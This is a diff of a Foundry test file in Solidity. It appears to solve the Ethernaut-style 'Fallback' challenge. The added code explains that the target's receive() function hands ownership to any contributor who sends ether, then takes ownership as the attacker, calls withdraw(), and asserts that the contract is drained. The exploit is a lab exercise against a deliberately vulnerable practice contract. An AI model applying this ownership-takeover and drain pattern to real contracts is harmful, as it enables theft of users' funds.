@@ -77,13 +77,49 @@ contract FallbackTest is Test {
         // Now Contract Balance Shloud be 
         assert(address(fallbackContract).balance == beforeStealContractBlance + 1000 wei);
 
+        /**
+            From The Fallback Contract 
+            Below Recevive Function is 
+            receive() external payable {
+            require(msg.value > 0 && contributions[msg.sender] > 0);
+            owner = msg.sender;
+            is excuted for our below low level Call 
+            (bool sent, ) = payable(fallbackContract).call{value: 1000 wei}("");
+            and the     owner = msg.sender;
+            which sets the msg.sender to our attacker
+            below aour assertion should pass now
+         */
 
+        // Below Test Sholud passed
+        assertEq( fallbackContract.owner() , attacker);
+        assert(fallbackContract.owner() != fallbackContractOwner);
 
+        // Now Attacker Can Call withdraw function and steal all the money from the contract
+        // And Contract balance Will zero
 
+        // Contract balance before withdraw
 
+        assert(address(fallbackContract).balance == beforeStealContractBlance + 1000 wei);
 
-   
-    }
+        // Call Withdraw From the Attacker
+
+        uint contarctbalance = address(fallbackContract).balance;
+
+        vm.startPrank(attacker);
+        fallbackContract.withdraw();
+        vm.stopPrank();
+
+        // Now the Contarct Balace Should be Zero
+
+        assert(address(fallbackContract).balance == 0);
+
+        // Attacker balance would more than his initial balance which was 1 ether
+
+        assert(address(attacker).balance > 1 ether );
+        console.log("Attacker Balance Is Now ", address(attacker).balance);
+
+  
+  } 
 
 
 
